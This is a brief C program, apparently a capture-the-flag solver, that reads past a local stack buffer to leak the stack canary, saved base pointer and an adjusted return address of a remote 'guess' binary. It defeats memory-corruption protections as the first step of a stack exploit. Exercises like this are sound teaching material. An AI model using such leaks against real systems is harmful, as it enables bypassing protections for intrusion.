#include <stdio.h>

typedef int (*printf_ptr_t)(const char *format, ...);
void solver(printf_ptr_t fptr) {
	char msg[8] = {'A'};
	fptr("canary = %llx\n", *(unsigned long*)(msg+0x8));
	fptr("rbp = %llx\n", *(unsigned long*)(msg+0x10));
	fptr("return addr = %llx\n", *(unsigned long*)(msg+0x18)+0xab); //(msg+0x18) solver() return address, (msg+0x18)+0xab guess() return address(check on remoteguess.s)
	// for(unsigned long i = 0; i < 0x38; i+=0x8){
	// 	fptr("&fptr+%x: %p, val = %llx\n", i, (&fptr)+i, *(&fptr+i));
	// }
}

int main() {
	char fmt[16] = "** main = %p\n";
	printf(fmt, main);
	solver(printf);
	return 0;
}